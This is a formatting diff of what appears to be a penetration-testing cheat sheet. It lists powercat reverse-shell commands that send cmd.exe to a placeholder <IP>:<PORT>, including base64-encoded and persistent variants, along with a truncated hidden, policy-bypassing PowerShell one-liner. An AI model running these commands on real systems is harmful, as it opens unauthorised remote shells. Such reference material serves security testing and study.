@@ -10,17 +10,23 @@ C:\> powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object S
 
 ## 02 - Powercat
 
-- Generate reverse shell
+Generate reverse shell
 
-`PS C:\> powercat -c <IP> -p <PORT> -e cmd.exe -g`
+```
+PS C:\> powercat -c <IP> -p <PORT> -e cmd.exe -g
+```
 
-- Generate base64 encoded reverse shell
+Generate base64 encoded reverse shell
 
-`PS C:\> powercat -c <IP> -p <PORT> -e cmd.exe -ge`
+```
+PS C:\> powercat -c <IP> -p <PORT> -e cmd.exe -ge
+```
 
-- Persist Callback Shell
+Persist callback shell
 
-`PS C:\> powercat -c <IP> -p <PORT> -e cmd.exe -rep`
+```
+PS C:\> powercat -c <IP> -p <PORT> -e cmd.exe -rep
+```
 
 ---
 ## References
